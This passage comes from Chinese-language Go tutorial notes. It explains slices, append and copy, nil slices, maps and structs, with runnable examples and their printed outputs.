===\u0026gt; [2 3] len(s)= 2 cap(s)= 4 s= [2 3 111 222 333 444] a= [0 1 2 3 111 222] */ 4.3 切片截取 语法：varName[low:high:max] 长度概念：len=high-low 容量概念：cap=max-low\n操作 含义 s[n] 切片s中索引位置为n的项 s[:] 从切片s的索引位置0到len(s)-1处所获得的切片 s[low:] 从切片s的索引位置low到len(s)-1处所获得的切片 s[:high] 从切片s的索引位置0到high处所获得的切片，len=high s[low:high] 从切片s的索引位置low到high处所获得的切片，len=high-low s[low:high:max] 从切片s的索引位置low到high处所获得的切片，len=high-low，cap=max-low len(s) 切片s的长度，总是\u0026lt;=cap(s) cap(s) 切片s的容量，总是\u0026gt;=len(s) 示例说明：\n1 array := []int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9} 操作 结果 len 说明说明 cap array[:6:8] [0 1 2 3 4 5] 6 省略 low 8 array[5:] [5 6 7 8 9] 5 省略 high、 max 5 array[:3] [0 1 2] 3 省略 high、 max 10 array[:] [0 1 2 3 4 5 6 7 8 9] 10 全部省略 10 4.4 append() 函数 内建函数 append()，只能用于 Slice 类型！ append() 在原 Slice 的末尾追加元素，并返回一个新的切片，当切片容量不够时会自动扩容。（通常以2倍增加） append() 自动扩容机制：一旦超过原底层数组的容量，append() 时就会自动增加底层数组的容量，通常以2倍容量重新分配底层数组，并复制原来的数据。 append() 扩容示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 func main() { s1 := make([]int, 0, 0) oldCap := cap(s1) fmt.Printf(\u0026#34;len(s1)=%v, cap(s1)=%v\\n\u0026#34;, len(s1), oldCap) for i := 0; i \u0026lt; 20; i++ { s1 = append(s1, i) //容量不够时，通常会以2倍容量进行扩容 if newCap := cap(s1); oldCap \u0026lt; newCap { fmt.Printf(\u0026#34;cap change: oldCap=%d ===\u0026gt; newCap=%d\\n\u0026#34;, oldCap, newCap) oldCap = newCap } else { fmt.Println(\u0026#34;sufficient capacity. not necessarily allocate capacity.\u0026#34;) } } } /* 运行结果： len(s1)=0, cap(s1)=0 cap change: oldCap=0 ===\u0026gt; newCap=1 cap change: oldCap=1 ===\u0026gt; newCap=2 cap change: oldCap=2 ===\u0026gt; newCap=4 sufficient capacity. not necessarily allocate capacity. cap change: oldCap=4 ===\u0026gt; newCap=8 sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. cap change: oldCap=8 ===\u0026gt; newCap=16 sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. cap change: oldCap=16 ===\u0026gt; newCap=32 sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. sufficient capacity. not necessarily allocate capacity. */ 4.5 copy() 函数 内建函数 copy()，只能用于 Slice 类型！ 在两个 Slice 间复制数据，复制长度以 len() 小的为准，两个 Slice 可指向同一底层数组。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 func main() { srcSlice := []int{1, 2} dstSlice := []int{7, 8, 9, 10} n := copy(dstSlice, srcSlice) //相当于把srcSlice替换到dstSlice的开始处 fmt.Println(\u0026#34;dstSlice=\u0026#34;, dstSlice) fmt.Printf(\u0026#34;how much copied:%d\\n\u0026#34;, n) fmt.Println(\u0026#34;------------------------------------------\u0026#34;) srcSlice = []int{1, 2, 3, 4, 5} dstSlice = []int{77, 88} n = copy(dstSlice, srcSlice) //目标切片只有2个容量，所以只有2个被copy过去，其余都丢弃 fmt.Println(\u0026#34;dstSlice=\u0026#34;, dstSlice) fmt.Printf(\u0026#34;how much copied:%d\\n\u0026#34;, n) fmt.Println(\u0026#34;------------------------------------------\u0026#34;) srcSlice = []int{1, 2, 3, 4, 5} dstSlice = make([]int, 10) //剩余的元素的值使用默认类型的零值 n = copy(dstSlice, srcSlice) fmt.Println(\u0026#34;dstSlice=\u0026#34;, dstSlice) fmt.Printf(\u0026#34;how much copied:%d\\n\u0026#34;, n) } /* 运行结果： dstSlice= [1 2 9 10] how much copied:2 ------------------------------------------ dstSlice= [1 2] how much copied:2 ------------------------------------------ dstSlice= [1 2 3 4 5 0 0 0 0 0] how much copied:5 */ 4.6 切片作为函数参数是引用传递(传址) 切片作为函数的参数，采用引用传递（传址），不会像数组那样把整个都拷贝一份传递过去，切片只是把它的内存地址传递过去。 由于切片是引用传递（传址），所以传参时没必要用到指针，也能实现同时修改。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;time\u0026#34; ) //初始化切片 func InitSlice(s []int) { //参数是int类型的切片 rand.Seed(time.Now().UnixNano()) //以当前时间的纳秒作为种子 for i := 0; i \u0026lt; 10; i++ { s[i] = rand.Intn(100) //0~100的随机正整数 } } //冒泡排序 func Bubbling(s []int) { //参数是int类型的切片 sLen := len(s) for i := 0; i \u0026lt; sLen; i++ { for j := 0; j \u0026lt; sLen-i-1; j++ { if s[j] \u0026gt; s[j+1] { s[j], s[j+1] = s[j+1], s[j] } } } } func main() { n := 10 s := make([]int, n) //声明一个长度为n的int类型切片 InitSlice(s) fmt.Println(\u0026#34;before store, s=\u0026#34;, s) Bubbling(s) fmt.Println(\u0026#34;after store, s=\u0026#34;, s) } /* 运行结果： before store, s= [48 63 24 35 4 0 41 21 61 78] after store, s= [0 4 21 24 35 41 48 61 63 78] */ 4.7 slice 只允许和 nil 做比较 slice 类型的零值为 nil，slice 类型只允许和 nil 做比较。\n4.7.1 nil 表示没有内存空间 slice 数据类型是引用类型，只有当不分配内存空间时，才为 nil。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 func main() { var s1 []int //只是声明，不会去申请内存空间 fmt.Printf(\u0026#34;s1 == nil ? %t, addr:%p, len(s1)=%d\\n\u0026#34;, s1 == nil, s1, len(s1)) s1 = nil //手动显示地赋值了 nil，那么肯定是 nil fmt.Printf(\u0026#34;s1 == nil ? %t, addr:%p, len(s1)=%d\\n\u0026#34;, s1 == nil, s1, len(s1)) //切片的值可以为 nil，可以写成转换表达式 []int(nil) s1 = []int(nil) //[]int{nil} 会报错，因为 int 的零值不是 nil fmt.Printf(\u0026#34;s1 == nil ? %t, addr:%p, len(s1)=%d\\n\u0026#34;, s1 == nil, s1, len(s1)) s1 = []int{} //赋值了，只是它是一个没有元素的空切片，赋值会去申请开辟内存空间 fmt.Printf(\u0026#34;s1 == nil ? %t, addr:%p, len(s1)=%d\\n\u0026#34;, s1 == nil, s1, len(s1)) s2 := []int{} //短变量就是声明+赋值，就是初始化，初始化了就会去申请内存空间 fmt.Printf(\u0026#34;s2 == nil ? %t, addr:%p, len(s2)=%d\\n\u0026#34;, s2 == nil, s2, len(s2)) s3 := []int(nil) fmt.Printf(\u0026#34;s3 == nil ? %t, addr:%p, len(s3)=%d\\n\u0026#34;, s3 == nil, s3, len(s3)) //make() 函数会返回一个具体的类型，只有是引用类型才能使用 make() 函数，既然引用了，那么这个类型就已经存在于内存中 s4 := make([]int, 0) fmt.Printf(\u0026#34;s4 type is:%T, s4 == nil ? %t, addr:%p, len(s4)=%d\\n\u0026#34;, s4, s4 == nil, s4, len(s4)) //具体类型赋值给了变量，这个变量其实是引用类型了，那么就有了内存空间 var s5 = make([]int, 0) fmt.Printf(\u0026#34;s5 type is:%T, s5 == nil ? %t, addr:%p, len(s5)=%d\\n\u0026#34;, s5, s5 == nil, s5, len(s5)) } /* 运行结果： s1 == nil ? true, addr:0x0, len(s1)=0 s1 == nil ? true, addr:0x0, len(s1)=0 s1 == nil ? true, addr:0x0, len(s1)=0 s1 == nil ? false, addr:0x5a7da8, len(s1)=0 s2 == nil ? false, addr:0x5a7da8, len(s2)=0 s3 == nil ? true, addr:0x0, len(s3)=0 s4 type is:[]int, s4 == nil ? false, addr:0x5a7da8, len(s4)=0 s5 type is:[]int, s5 == nil ? false, addr:0x5a7da8, len(s5)=0 */ 4.7.2 这些情况下，slice 的值为 nil 4.7.2.1 var s []int 形式的声明 var s []int 只是声明，没有给值（没有赋值），不会去申请内存空间。\n4.7.2.2 s = []int(nil) 转换表达式 因为 slice 的值可以为 nil，所以可以使用这个转换表达式：[]int(nil)。\n4.7.2.3 手动赋值为 nil 1 2 3 4 5 6 func main() { s := []int{} s = nil fmt.Printf(\u0026#34;s == nil ? %t, addr:%p, len(s)=%d\\n\u0026#34;, s == nil, s, len(s)) //s == nil ? true, addr:0x0, len(s)=0 } 手动给了 nil，那么肯定为 nil 了。\n4.8 对 Slice 进行截取时，起始下标刚好等于长度 对 Slice 进行截取时，起始位置的下标刚好等于这个 Slice 的长度。此时，是没有任何语法错误的，只是结果是一个空切片。 演示：\n1 2 3 4 5 func main() { s := []int{0, 1, 2, 3, 4} fmt.Printf(\u0026#34;len(s)=%[1]d, cap(s)=%[1]d, type:%[1]T\\n\u0026#34;, s[5:]) //len(s)=[], cap(s)=[], type:[]int } 在 Golang 中，对 Slice 和 string 进行范围截取（也就是 [m:n]）时。m 和 n 的值，只要在这个范围内：0 \u0026lt;= m \u0026lt;= n \u0026lt;= len(s)，就不会发生任何错误、异常。 大致上的原因个人分析： 以上面这个代码片段为例。Slice 变量 s 中，有 5 个元素，长度为 5。在 Golang 中，上届 n 和下届 m，他们是互斥的。能够截取多少个元素是由 n - m 所决定的。代码片段中，进行了 s[5:] 的操作。此时，上届没有指定，那么默认就是 5，因为 s 的长度为 5，上届已经指定了是 5。上届和下届都是在 0 \u0026lt;= m \u0026lt;= n \u0026lt;= len(s) 这个范围中，符合规范。5 - 5 = 0，只能取到 0 个元素，所以最终是个空切片。 另外注意：上届可以超过长度，但不能超过容量！ 我的理解是基于 stackoverflow 上的这个解答：link\n4.9 切片与数组的区别和关系 4.9.1 区别：长度 数组：数组的长度是固定写死的，方括号 [] 中必须写明常量，例：a := [5]int{}。 切片：方括号 [] 中不写或者 ... 来代替，例：a := [...]int{}。\n4.9.2 区别：做函数调用时 数组是按值传递（传值），切片是按引用传递（传址）。\n4.9.3 区别：只有 Slice 可以使用 append() 函数 append() 的第一个参数必须切片类型。 示例：\n1 2 3 4 5 func main() { a := [6]int{0, 1, 2, 3, 4, 5} a = append(a, 111111) // first argument to append must be slice; have [6]int fmt.Println(\u0026#34;a=\u0026#34;, a) } 数组的长度是固定不能修改的，append() 将会改变数组的长度，自相矛盾了。\n4.9.4 关系：切片是对底层数组的引用 引用表示共用同一个内存地址。 例1：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func main() { a := [10]int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9} // 这是数组 s1 := a[2:5] // 这是切片 fmt.Printf(\u0026#34;s1=%v, len(s1)=%v, cap(s1)=%v\\n\u0026#34;, s1, len(s1), cap(s1)) // s1=[2 3 4], len(s1)=3, cap(s1)=8 fmt.Println(\u0026#34;--------------------------\u0026#34;) // 引用表示的是它们同时在使用同一个内存地址，无论哪一个修改，都是在直接修改内存地址 // 由于是使用同一个内存地址，所以最终的值都是一样 s1[1] = 9999 // 切片是对数组的引用，修改切片中的元素，将会影响到底层的数组 fmt.Println(\u0026#34;s1=\u0026#34;, s1) // s1= [2 9999 4] fmt.Println(\u0026#34;a=\u0026#34;, a) // a= [0 1 2 9999 4 5 6 7 8 9] fmt.Println(\u0026#34;--------------------------\u0026#34;) a[2] = 100000 // 数组修改元素后，切片是引用了数组，一样也会改变切片的元素 fmt.Println(\u0026#34;s1=\u0026#34;, s1) fmt.Println(\u0026#34;a=\u0026#34;, a) } /* 运行结果： s1=[2 3 4], len(s1)=3, cap(s1)=8 -------------------------- s1= [2 9999 4] a= [0 1 2 9999 4 5 6 7 8 9] -------------------------- s1= [100000 9999 4] a= [0 1 100000 9999 4 5 6 7 8 9] */ 例2：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 func main() { a := [10]int{0, 1, 2, 3, 4, 5, 6, 7, 8, 9} s1 := a[2:5] //切片，从数组下标2开始引用3个元素，cap=len(a)-2 fmt.Printf(\u0026#34;s1=%v, len(s1)=%v, cap(s1)=%v\\n\u0026#34;, s1, len(s1), cap(s1)) fmt.Println(\u0026#34;---------------------------------------\u0026#34;) s2 := s1[2:8] //此时s1的cap为8，所以取下标时不要越界了。这里从切片s1的下标2开始取6个元素 fmt.Printf(\u0026#34;before change: s1=%v\\n\u0026#34;, s1) fmt.Printf(\u0026#34;before change: s2=%v\\n\u0026#34;, s2) fmt.Println(\u0026#34;---------------------------------------\u0026#34;) s2[3] = 7777777 fmt.Printf(\u0026#34;after changed: s1=%v\\n\u0026#34;, s1) fmt.Printf(\u0026#34;after changed: s2=%v\\n\u0026#34;, s2) fmt.Println(\u0026#34;a=\u0026#34;, a) } /* 运行结果： s1=[2 3 4], len(s1)=3, cap(s1)=8 --------------------------------------- before change: s1=[2 3 4] before change: s2=[4 5 6 7 8 9] --------------------------------------- after changed: s1=[2 3 4] after changed: s2=[4 5 6 7777777 8 9] a= [0 1 2 3 4 5 6 7777777 8 9] */ 4.10 语法糖 ... ... 作为 Go 语言的语法糖，主要有 2 个用途：作为函数的不定长参数，打散切片。\n4.10.1 作为函数的不定长参数 作为函数不定长参数的使用，已在 Day2 笔记中有记录。前往笔记\n4.10.2 打散切片 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { src := []int{1, 2, 3} dst := []int{4, 5, 6} fmt.Printf(\u0026#34;before append, src = %v\\n\u0026#34;, src) src = append(src, dst...) fmt.Printf(\u0026#34;after append, src = %v\\n\u0026#34;, src) } /* 运行结果： before append, src = [1 2 3] after append, src = [1 2 3 4 5 6] */ 本质上是因为 append() 函数的第二个参数，它是某个数据类型的不定长参数。不定长参数需要接受的是具体的类型，而不是一个切片。因此，使用 ... 将切片打散后，就变成了一个个具体的数据类型，那么就符合了 append() 函数参数的类型。\n五、map 底层使用哈希表 HashMap 实现的无序的 key-value 键值对的集合，一个 map 中所有的** key 是唯一的**。 key 必须是支持 == 和 != 操作符的数据类型。切片、函数以及包含切片的结构类型由于具有引用语义，不能作为 map 的 key。 value 可以是任意类型，没有限制。map 里所有 key 的数据类型必须是相同的，value 的数据类型也必须都是相同的。但 key 和 value 的数据类型可以是不同的。\n5.1 声明、初始化 map 5.1.1 map[key数据类型]value数据类型 语法格式：map[keyType]valueType\n1 2 3 4 func main() { var m1 map[int]string // 声明一个 map，但没有给值（没有初始化），所以是个空 map fmt.Println(\u0026#34;m1=\u0026#34;, m1) // m1= map[] } 5.1.2 make() 函数 语法格式：varName := make(map[keyType]valueType, len)，len 可以省略不写，map 是根据元素数量自动对 len 进行扩容。 注：如果明确知道了这个 map 会有多少个元素，最好把 len 写上。因为它在 make() 的时候就把对应长度的内存空间申请下来了，不用每次都去检测、自动扩容，提高了效率。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { m1 := make(map[int]string) //map可以不指定长度，因为它会自动扩容 fmt.Println(\u0026#34;m1=\u0026#34;, m1) m2 := make(map[int]string, 2) fmt.Printf(\u0026#34;m2=%v, len(m2)=%d\\n\u0026#34;, m2, len(m2)) //map中的len是计算元素的数量 m2[0] = \u0026#34;go\u0026#34; //对map的操作 m2[1] = \u0026#34;python\u0026#34; m2[2] = \u0026#34;rust\u0026#34; fmt.Printf(\u0026#34;m2=%v, len(m2)=%d\\n\u0026#34;, m2, len(m2)) //map会对len自动扩容 } /* 运行结果： m1= map[] m2=map[], len(m2)=0 m2=map[0:go 1:python 2:rust], len(m2)=3 */ 另外要注意一点：make() 中的 len 属性可以指定 map 的长度，但无法获得他的 cap。 错误示例：（这段代码编译都编不过，编译时错误）\n1 2 3 4 5 6 7 8 func main() { m := make(map[string]int, 2) m[\u0026#34;a\u0026#34;] = 1 m[\u0026#34;b\u0026#34;] = 2 m[\u0026#34;c\u0026#34;] = 3 m[\u0026#34;d\u0026#34;] = 4 fmt.Println(\u0026#34;cap(m) =\u0026#34;, cap(m)) // invalid argument m (type map[string]int) for cap } 5.1.3 初始化 map 的方式 键值对的写法：key:value。\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { m1 := map[int]string{1: \u0026#34;python\u0026#34;, 2: \u0026#34;rust\u0026#34;, 0: \u0026#34;go\u0026#34;} //每个元素都是key:value的写法 fmt.Println(\u0026#34;m1=\u0026#34;, m1) m2 := map[string]int{\u0026#34;go\u0026#34;: 1, \u0026#34;python\u0026#34;: 2, \u0026#34;C\u0026#34;: 0} fmt.Println(\u0026#34;m2=\u0026#34;, m2) } /* 运行结果： m1= map[0:go 1:python 2:rust] m2= map[C:0 go:1 python:2] */ 5.1.4 短变量初始化方式 如果 key 已存在，则会覆盖该 key 对应的 value。\n1 2 3 4 5 6 7 8 9 10 11 12 13 func main() { m1 := map[int]string{0: \u0026#34;C\u0026#34;, 1: \u0026#34;go\u0026#34;} //初始化 fmt.Println(\u0026#34;m1=\u0026#34;, m1) m1[0] = \u0026#34;rust\u0026#34; //有该key则修改该key对应的value m1[3] = \u0026#34;python\u0026#34; //没有该key则追加，底层自动会扩容length fmt.Println(\u0026#34;m1=\u0026#34;, m1) } /* 运行结果： m1= map[0:C 1:go] m1= map[0:rust 1:go 3:python] */ 5.2 map遍历 使用 for 循环搭配 range 进行遍历，第一个返回 key，第二个返回 value。遍历结果为无序，因为 map 本身就是无序的。 例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func main() { m1 := map[int]string{0: \u0026#34;C\u0026#34;, 1: \u0026#34;go\u0026#34;, 2: \u0026#34;python\u0026#34;, 3: \u0026#34;rust\u0026#34;} //初始化 for key, value := range m1 { fmt.Printf(\u0026#34;key=%d, value=%s\\n\u0026#34;, key, value) } } /* 运行结果： key=2, value=python key=3, value=rust key=0, value=C key=1, value=go */ 5.3 判断key是否存在 语法：mapName[key]。 返回 2 个结果：第一个是该 key 所对应的 value，第二个返回该 key 是否存在于 map 中的 bool。如果 key 不存在，value 返回其类型对应的零值。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func main() { m1 := map[int]string{0: \u0026#34;C\u0026#34;, 1: \u0026#34;go\u0026#34;, 2: \u0026#34;python\u0026#34;, 3: \u0026#34;rust\u0026#34;} //初始化 //第一个返回key对应的值，第二个返回key是否存在于map中的bool value, ok := m1[1] fmt.Printf(\u0026#34;value=%v, ok=%v\\n\u0026#34;, value, ok) value, ok = m1[10] //不存在返回该值所对应的零值 fmt.Printf(\u0026#34;value=%v, ok=%v\\n\u0026#34;, value, ok) } /* 运行结果： value=go, ok=true value=, ok=false */ 5.4 删除一对键值 语法：delete(mapName, key)。 注：如果 key 为 nil 或不存在与 map 中，delete 将会是个无操作指令（不会报错）！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 func main() { m1 := map[int]string{0: \u0026#34;C\u0026#34;, 1: \u0026#34;go\u0026#34;, 2: \u0026#34;python\u0026#34;, 3: \u0026#34;rust\u0026#34;} //初始化 fmt.Println(\u0026#34;m1=\u0026#34;, m1) delete(m1, 3) //有这个key，就删除这对键值 fmt.Println(\u0026#34;m1=\u0026#34;, m1) delete(m1, 10) //key不存在于map中，delete将是无操作指令 fmt.Println(\u0026#34;m1=\u0026#34;, m1) } /* 运行结果： m1= map[0:C 1:go 2:python 3:rust] m1= map[0:C 1:go 2:python] m1= map[0:C 1:go 2:python] */ 5.5 map作为函数参数 map 作为函数参数传递是引用传递（传址），用的是同一个 map。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import \u0026#34;fmt\u0026#34; func test(m map[int]string) { //注意参数类型要一样 delete(m, 0) //用的是同一个map，因此操作会影响到原有的map delete(m, 3) } func main() { m1 := map[int]string{0: \u0026#34;C\u0026#34;, 1: \u0026#34;go\u0026#34;, 2: \u0026#34;python\u0026#34;, 3: \u0026#34;rust\u0026#34;} //初始化 fmt.Println(\u0026#34;m1=\u0026#34;, m1) test(m1) //引用传递 fmt.Println(\u0026#34;m1=\u0026#34;, m1) } /* 运行结果： m1= map[0:C 1:go 2:python 3:rust] m1= map[1:go 2:python] */ 六、Struct结构体 结构体是一种聚合的数据类型，它是由一系列具有相同类型或不同类型的数据构成的数据集合，每个数据称为结构体的成员。 简而言之：结构体可以将不同类型的数据整合成一个有机的整体。\n6.1 结构体的初始化 基本语法：\n1 2 3 4 5 6 type 变量名 struct { 成员变量名1 数据类型 成员变量名2 数据类型 ... 成员变量名n 数据类型 } 注意：成员变量名前不要加var。\n6.1.1 普通变量 1.顺序初始化 顺序初始化，每个成员都必须给值，否则就报错！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { //顺序初始化，每个成员都必须给值 var s1 Student = Student{0, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} fmt.Println(\u0026#34;struct s1=\u0026#34;, s1) var s2 Student = Student{1, \u0026#34;python\u0026#34;} //报错：too few values in Student literal fmt.Println(\u0026#34;struct s2=\u0026#34;, s2) } 2.指定成员初始化 指定成员初始化，没有指定的成员自动给其对应数据类型的零值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { //指定成员初始化 s1 := Student{name: \u0026#34;python\u0026#34;, address: \u0026#34;Netherlands\u0026#34;} //自动推导类型 fmt.Println(\u0026#34;s1=\u0026#34;, s1) //s1= {0 python 0 0 Netherlands} } 6.1.2 指针变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { var s1 *Student //s1声明成一个Student结构体的指针 s1 = \u0026amp;Student{0, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} //别忘了取地址符\u0026amp; fmt.Println(\u0026#34;*s1=\u0026#34;, *s1) //取值需要使用星花符* s2 := \u0026amp;Student{id: 1, name: \u0026#34;python\u0026#34;, address: \u0026#34;Netherlands\u0026#34;} //自动推导类型为Student结构体指针 fmt.Printf(\u0026#34;s2 type is : %T\\n*s2=%v\u0026#34;, s2, *s2) //main包中，Student结构体指针类型 } /* 运行结果： *s1= {0 go 77 11 Google Inc.} s2 type is : *main.Student *s2={1 python 0 0 Netherlands} */ 6.2 结构体成员的使用：普通变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { //声明一个结构体普通变量 var s1 Student //操作成员，使用点\u0026#34;.\u0026#34;运算符 s1.id = 0 s1.name = \u0026#34;go\u0026#34; //未操作的成员，值为对应数据类型的零值 fmt.Println(\u0026#34;s1=\u0026#34;, s1) //s1= {0 go 0 0 } } 6.3 结构体成员的使用：指针变量 6.3.1 指针指向结构体普通变量的内存地址 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { //指针有合法指向后，才能操作成员 //1.定义一个普通结构体变量 var s1 Student //2.定义一个结构体指针 var p1 *Student //指针指向普通结构体变量的内存地址，指向一个合法的内存地址 p1 = \u0026amp;s1 //以下两种写法完全等价 p1.id = 0 (*p1).name = \u0026#34;go\u0026#34; p1.address = \u0026#34;Google Inc.\u0026#34; fmt.Println(\u0026#34;*p1=\u0026#34;, *p1) //取指针中的值，需要使用星花符\u0026#34;*\u0026#34; fmt.Println(\u0026#34;s1=\u0026#34;, s1) //直接打印s1的值 } /* 运行结果： *p1= {0 go 0 0 Google Inc.} s1= {0 go 0 0 Google Inc.} */ 6.3.2 new()函数指向 new() 返回一个类型的指针，指针指向的是内存地址，相当于是去内存中申请了一块空间。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { //指针有合法指向后，才能操作成员 //使用new()去申请一个结构体指针，留出一块内存空间并指向这块内存空间，也是一个合法的指向 s1 := new(Student) //return *Type s1.name = \u0026#34;golang\u0026#34; (*s1).address = \u0026#34;Google Inc.\u0026#34; s1.sex = \u0026#39;M\u0026#39; //最终以ASCII码值的形式打印出来 fmt.Printf(\u0026#34;*s1=%v, s1 address: %p\u0026#34;, *s1, \u0026amp;s1) //s1是一个合法指针，取值需要使用星花符\u0026#34;*\u0026#34;，取地址使用\u0026amp; } /* 运行结果： *s1={0 golang 77 0 Google Inc.}, s1 address: 0xc000006028 */ 6.4 结构体比较 结构体的比较只支持 == 和 !=。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { s1 := Student{1, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} s2 := Student{1, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} s3 := Student{1, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc\u0026#34;} //至少了最后一个点\u0026#34;.\u0026#34; fmt.Println(\u0026#34;s1 == s2?\u0026#34;, s1 == s2) fmt.Println(\u0026#34;s1 == s3?\u0026#34;, s1 == s3) } /* 运行结果： s1 == s2? true s1 == s3? false */ 从以上示例中可以看出：结构体之间的比较是它们成员值的逐一完全比较，s3 的成员 address 字符串值中只少了一个 .，两者比较就是不相等了！\n6.5 结构体赋值 同类型的两个结构体变量可以相互赋值。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } func main() { s1 := Student{1, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} var tmp Student //tmp也声明为Student类型 tmp = s1 //只有同类型的结构体才能相互赋值，s1的类型也是Student fmt.Println(\u0026#34;tmp=\u0026#34;, tmp) //tmp= {1 go 77 11 Google Inc.} } 6.6 结构体做函数参数：值传递 值传递：拷贝一份给形参，两个不同的作用域，修改的只是自己作用域内的。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } //值传递，函数内部无法修改外部的 func test(s Student) { s.id = 999 fmt.Println(\u0026#34;test s=\u0026#34;, s) } func main() { s := Student{1, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} test(s) //s拷贝一份给形参 fmt.Println(\u0026#34;main s=\u0026#34;, s) } /* 运行结果： test s= {999 go 77 11 Google Inc.} main s= {1 go 77 11 Google Inc.} */ 6.7 结构体做函数参数：引用传递（传址） 拿到了一个变量的内存地址，使用的就是同一个变量了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 //定义一个结构体类型 type Student struct { id int name string sex byte //字符类型，以ASCII码值打印 age int address string } //指针指向内存地址，拿到了内存地址，就是在使用同一个变量了 func test(s *Student) { s.id = 999 //此时s是指针了，指向了实参的内存地址，这里修改就会影响到实参 (*s).address = \u0026#34;MountainView Google\u0026#34; fmt.Println(\u0026#34;test s=\u0026#34;, *s) //取出指针指向内存地址中的值，使用星花符\u0026#34;*\u0026#34; } func main() { s := Student{1, \u0026#34;go\u0026#34;, \u0026#39;M\u0026#39;, 11, \u0026#34;Google Inc.\u0026#34;} fmt.Println(\u0026#34;before call test, main s=\u0026#34;, s) test(\u0026amp;s) //s的地址传给形参 fmt.Println(\u0026#34;after called, main s=\u0026#34;, s) } /* 运行结果： before call test, main s= {1 go 77 11 Google Inc.} test s= {999 go 77 11 MountainView Google} after called, main s= {999 go 77 11 MountainView Google} */ 6.8 带标签的结构体 结构体中的字段除了有名字和类型外，还可以有一个可选的标签 tag 。它是一个附属于字段的字符串，可以是文档或其他的重要标记，只有 reflect 包能获取它。 调用 reflect.TypeOf(variableName) （参数是一个变量名）可以获取该变量的正确类型。 如果变量是一个结构体类型，就可以通过 Field(int) 来索引结构体中的字段，然后就可以使用 Tag 属性。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 import ( \u0026#34;fmt\u0026#34; \u0026#34;reflect\u0026#34; ) type TagType struct { field1 bool \u0026#34;An important answer\u0026#34; field2 string \u0026#34;The name of the thing\u0026#34; field3 int \u0026#34;How much there are\u0026#34; } func refTag(tt TagType, ix int) { ttType := reflect.TypeOf(tt) //获取到变量的类型 ixField := ttType.Field(ix) 